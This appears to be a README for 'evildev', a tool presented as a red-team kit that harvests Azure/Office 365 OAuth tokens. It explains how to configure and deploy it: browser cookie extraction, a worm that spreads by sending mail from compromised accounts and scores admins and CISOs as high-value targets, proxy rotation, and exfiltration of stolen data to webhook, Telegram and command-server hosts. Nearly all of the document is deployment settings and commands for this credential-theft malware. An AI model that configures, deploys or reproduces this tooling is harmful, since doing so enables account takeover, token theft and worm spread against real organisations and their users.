# Environment Configuration Guide

## Files Created

| File | Purpose |
|------|---------|
| `.env` | Complete configuration with all variables documented |
| `.env.dev` | Development/testing configuration (debug enabled, no auth) |
| `.env.staging` | Staging configuration (auth enabled, no worm) |
| `.env.production` | Production configuration (all features enabled) |
| `exfil_config.example.json` | Example exfiltration channel configuration |
| `env_helper.py` | Python utility for environment management |

## Quick Start

### 1. Choose Your Environment

```bash
# Development (local testing)
cp .env.dev .env

# Staging (pre-engagement testing)
cp .env.staging .env

# Production (live red team engagement)
cp .env.production .env
```

### 2. Configure Required Variables

Edit `.env` and set these critical values:

```bash
# Azure/Office 365 OAuth target
CLIENT_ID=04b07795-8ddb-461a-bbee-02f9e1bf7b46

# Basic auth credentials (if REQUIRE_AUTH=true)
AUTH_USER=operator
AUTH_PASS=StrongPassword123!

# Exfil configuration (JSON file, HTTP endpoint, or direct JSON)
EXFIL_CONFIG=./exfil_config.json

# Optional: Enable worm propagation
WORM_ENABLED=true
```

### 3. Run the Application

```bash
# Automatic: Flask loads .env automatically
python evildev/app.py

# Manual: Load specific env file
python -c "from dotenv import load_dotenv; load_dotenv('.env.dev')" && python evildev/app.py
```

## Configuration by Scenario

### Scenario 1: Quick Testing (Local)

```bash
# Use .env.dev
PORT=5000
DEBUG=true
FLASK_DEBUG=true
REQUIRE_AUTH=false
WORM_ENABLED=false
PLAYWRIGHT=false
```

**Run:**
```bash
python evildev/app.py
# Access: http://localhost:5000
```

### Scenario 2: Pre-Engagement Testing (Staging)

```bash
# Use .env.staging
PORT=5000
DEBUG=false
REQUIRE_AUTH=true
AUTH_USER=operator
AUTH_PASS=StagingPassword123!
WORM_ENABLED=false
EXFIL_CONFIG=./exfil_config.json
```

**Run:**
```bash
python evildev/app.py
# Access with auth: http://operator:StagingPassword123@localhost:5000
```

### Scenario 3: Live Red Team Engagement (Production)

```bash
# Use .env.production
PORT=5000
DEBUG=false
REQUIRE_AUTH=true
AUTH_USER=operator
AUTH_PASS=ProductionPassword123!
WORM_ENABLED=true
WORM_MAX_TARGETS=10
PROXY_LIST=http://proxy1:8080\nhttp://proxy2:8080
PLAYWRIGHT=true
EXFIL_CONFIG=https://command-server.example.com/exfil-config.json
EXFIL_CONFIG_ENCRYPTED=true
ENCRYPTION_KEY=your_32_byte_hex_key_here
```

**Run with gunicorn (production-grade):**
```bash
gunicorn -w 4 -b 0.0.0.0:5000 evildev.app:app
```

## Environment Variables Reference

### Critical Variables

| Variable | Required | Example | Notes |
|----------|----------|---------|-------|
| `CLIENT_ID` | ✅ | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` | Azure/Office 365 app ID |
| `TENANT` | ❌ | `common` or UUID | Azure tenant |
| `PORT` | ❌ | `5000` | Server port |

### Security Variables

| Variable | Type | Notes |
|----------|------|-------|
| `AUTH_USER` | string | Basic auth username |
| `AUTH_PASS` | string | Basic auth password |
| `ENCRYPTION_KEY` | hex (64 chars) | AES-256 key for config encryption |
| `WORM_MASTER_KEY` | hex (64 chars) | Worm database encryption key |

### Feature Toggles

| Variable | Values | Purpose |
|----------|--------|---------|
| `WORM_ENABLED` | `true`/`false` | Enable worm propagation |
| `PLAYWRIGHT` | `true`/`false` | Enable browser-based cookie extraction |
| `REQUIRE_AUTH` | `true`/`false` | Enable basic auth protection |
| `DEBUG` | `true`/`false` | Verbose logging |
| `DISABLE_SSL_VERIFY` | `true`/`false` | Ignore SSL cert errors |

## Using the Environment Helper

```bash
# List available environment files
python env_helper.py --list

# Load and validate .env
python env_helper.py --env .env --validate

# Show active configuration (redacts sensitive values)
python env_helper.py --show

# Generate a new encryption key
python env_helper.py --gen-key
```

## Exfiltration Configuration

### File-Based Exfil

```bash
EXFIL_CONFIG=./exfil_config.json
```

Create `exfil_config.json`:
```json
{
  "channels": [
    {
      "name": "local_file",
      "type": "file",
      "path": "./logs/exfil_data.json"
    }
  ]
}
```

### HTTP Webhook Exfil

```bash
EXFIL_CONFIG=./exfil_config.json
```

```json
{
  "channels": [
    {
      "type": "http",
      "url": "https://webhook.example.com/exfil",
      "method": "POST",
      "headers": {
        "Authorization": "Bearer YOUR_TOKEN"
      }
    }
  ]
}
```

### Encrypted Remote Config

```bash
EXFIL_CONFIG=https://command-server.example.com/config.json
EXFIL_CONFIG_ENCRYPTED=true
ENCRYPTION_KEY=abc123def456...
```

### Telegram Exfil

```bash
EXFIL_CONFIG=./exfil_config.json
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
TELEGRAM_CHAT_ID=123456789
```

## Worm Propagation Configuration

### Basic Worm

```bash
WORM_ENABLED=true
WORM_MAX_DEPTH=2              # Propagate 2 levels
WORM_MAX_TARGETS=5            # 5 targets per account
```

### Advanced Worm with High-Value Targeting

```bash
WORM_ENABLED=true
WORM_MAX_DEPTH=3
WORM_MAX_TARGETS=10
WORM_PRIORITIZE_HIGH_VALUE=true
WORM_TARGET_SCORES={
  "admin":"20",
  "security":"15",
  "ciso":"25",
  "executive":"10"
}
```

## Proxy Configuration

### Single Proxy

```bash
PROXY_LIST=http://proxy.example.com:8080
```

### Multiple Proxies (Rotation)

```bash
PROXY_LIST=http://proxy1.example.com:8080
http://proxy2.example.com:8080
socks5://proxy3.example.com:1080
https://proxy4.example.com:8443
```

## Docker Deployment

Create `docker-compose.yml`:

```yaml
version: '3.8'
services:
  harvester:
    build: .
    ports:
      - "5000:5000"
    environment:
      - CLIENT_ID=${CLIENT_ID}
      - TENANT=${TENANT}
      - WORM_ENABLED=${WORM_ENABLED}
      - EXFIL_CONFIG=${EXFIL_CONFIG}
    volumes:
      - ./logs:/app/logs
      - ./.env:/app/.env:ro
    restart: unless-stopped
```

Run:
```bash
docker-compose --env-file .env.production up -d
```

## Troubleshooting

### App starts but immediately closes

**Check:**
- `python -c "from dotenv import load_dotenv; load_dotenv(); import os; print(os.environ.get('CLIENT_ID'))"`
- Verify `.env` file exists and is readable
- Check for syntax errors in `.env`

### Worm won't propagate

**Check:**
- `WORM_ENABLED=true` in `.env`
- `Mail.Send` scope included in `SCOPES`
- Token has `offline_access` for refresh capability

### Exfil fails silently

**Check:**
- `EXFIL_CONFIG` points to valid file or URL
- Webhook endpoints are reachable
- Credentials (tokens, keys) are valid
- Run with `DEBUG=true` for verbose output

## Security Best Practices

1. **Never commit .env files** - Add to `.gitignore`:
   ```
   .env
   .env.*.local
   *.key
   logs/
   ```

2. **Use environment-specific secrets:**
   - `.env` - Development (local machine only)
   - `.env.staging` - Staging server
   - `.env.production` - Vault/Secrets Manager

3. **Rotate credentials regularly:**
   - Change `AUTH_PASS` between engagements
   - Regenerate `ENCRYPTION_KEY` for new campaigns
   - Rotate webhook URLs and API tokens

4. **Enable SSL verification in production:**
   ```bash
   DISABLE_SSL_VERIFY=false
   ```

5. **Monitor logs:**
   ```bash
   tail -f logs/harvester.log
   ```

## Advanced Deployment

### AWS Systems Manager Parameter Store

```bash
# Store configuration in AWS
aws ssm put-parameter --name /harvester/ENCRYPTION_KEY --value "..." --type SecureString

# Load at runtime
import boto3
ssm = boto3.client('ssm')
key = ssm.get_parameter(Name='/harvester/ENCRYPTION_KEY', WithDecryption=True)
```

### HashiCorp Vault

```bash
# Store in Vault
vault kv put secret/harvester CLIENT_ID="..." ENCRYPTION_KEY="..."

# Load at runtime
import hvac
client = hvac.Client(url='http://vault:8200')
secret = client.secrets.kv.read_secret_version(path='harvester')
```

## Support

For issues with environment configuration, check:
- `.env` syntax (no quotes needed, unless value has spaces)
- Python-dotenv is installed: `pip list | grep dotenv`
- Environment variables are accessible: `env | grep CLIENT_ID`
- Application logs: `tail -f logs/harvester.log`
